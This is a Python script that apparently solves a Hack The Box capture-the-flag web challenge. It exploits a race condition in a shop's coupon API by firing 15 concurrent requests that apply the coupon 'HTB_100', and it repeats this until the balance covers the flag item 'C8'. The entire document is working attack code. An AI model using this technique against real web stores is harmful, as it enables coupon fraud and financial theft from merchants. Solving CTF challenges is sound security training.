import requests
import json
import threading

base_url = 'http://x.x.x.x:port'                # Challenge link provided by HTB
purchase_url = f"{base_url}/api/purchase"               # Purchase API endpoint
coupon_url = f"{base_url}/api/coupons/apply"            # Coupon apply API endpoint
headers = {"Content-Type": "application/json"}          # POST request accepts json data
purchase_data = json.dumps({"item": "C8"})              # We want to buy C8 to retrieve the flag
coupon_data = json.dumps({"coupon_code": "HTB_100"})    # We want to apply HTB_100 coupon to add to balance
purchase_response_text = "{\"message\":\"Insufficient balance!\"}"
num_threads = 15    # Number of concurrent threads
threads = []

# Apply HTB_100 coupon to add to balance
def apply_coupon():
    # Send the POST request to coupon apply API endpoint
    coupon_response = requests.post(coupon_url, data=coupon_data, headers=headers, cookies=cookies)
    print("Coupon Response:", coupon_response.text)

# Run until we have enough funds to buy C8
while "Insufficient balance" in purchase_response_text:
    # Attempt to make an initial purchase, which will fail
    purchase_response = requests.post(purchase_url, data=purchase_data, headers=headers)
    # So that we can grab the session cookie
    cookies = {'session':purchase_response.cookies['session']}

    # Run the apply_coupon function concurrently to exploit race condition
    for _ in range(num_threads):
        t = threading.Thread(target=apply_coupon)
        threads.append(t)
        t.start()

    # Wait for all threads to complete
    for t in threads:
        t.join()

    # Attempt to buy C8 after applying coupons
    purchase_response_text = requests.post(purchase_url, data=purchase_data, headers=headers, cookies=cookies).text
    print("Purchase Response:", purchase_response_text)
    print()
